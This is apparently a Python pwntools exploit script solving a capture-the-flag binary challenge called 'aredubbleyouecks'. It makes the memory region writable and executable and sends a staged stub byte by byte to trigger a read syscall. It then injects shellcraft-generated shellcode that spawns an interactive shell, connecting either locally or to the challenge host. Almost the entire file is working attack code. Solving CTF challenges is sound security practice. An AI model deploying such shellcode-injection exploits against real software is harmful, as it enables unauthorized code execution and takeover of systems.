#!/usr/bin/env python3

import os
os.chdir("./patched")

from pwn import *

exe = ELF("./aredubbleyouecks_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("box.acmcyber.com", 31379)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r


def main():
    r = conn()

    # Set the permission to PROT_WRITE | PROT_EXEC which is 2 | 4
    r.sendlineafter(b'give prot: ', b'6')

    # Send payload 1 by first sending the 6 1-byte instrs, before the 2-byte syscall instr
    payload_1 = asm('''
                    nop
                    nop
                    pop rdx
                    pop rdx
                    push rdi
                    pop rax
                    syscall
                    ''')
    log.info(f"{payload_1=}")
    for i in range(6):
        r.sendafter(b'fizzbuzz101: ', payload_1[i].to_bytes(1, byteorder='little'))
    r.sendafter(b'fizzbuzz102: ', payload_1[6:])
    
    # Payload 2: Buffer 2 bytes before the shell-spawning code
    payload_2 = b''.join([
        b'A'*0x2,
        asm(shellcraft.amd64.linux.sh()),
        b'A'*(0x1000 - 0x2 - len(asm(shellcraft.amd64.linux.sh())) - 1) # -1 to account for the newline char
    ])
    assert len(payload_2) == 0x1000-1
    r.sendline(payload_2)

    r.interactive()


if __name__ == "__main__":
    main()
